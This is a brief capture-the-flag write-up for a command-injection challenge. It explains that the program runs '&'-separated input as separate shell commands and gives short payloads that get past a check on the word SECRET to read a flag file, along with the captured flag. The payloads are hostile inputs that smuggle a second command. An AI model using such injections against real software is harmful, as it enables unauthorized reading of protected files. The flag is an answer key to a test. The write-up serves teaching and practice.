# 🔑 Write-Up

The code is literally an input where we enter a series of commands from bash separated by `&` (i.e., when we enter `&`, it splits the individual commands).
Note that an exception is thrown when the first command is SECRET.
Depending on how many commands are entered, a loop executes each of them individually.

We can simply enter a character escape:

```bash
ls&”SECRET/flag.txt”
```
or if you are on windows

```bash
cd&”SECRET/flag.txt”
```
and the flag will pop up


### 🚩 Flag

```plaintext
CTF_flag{injection_is_nice6781185}
```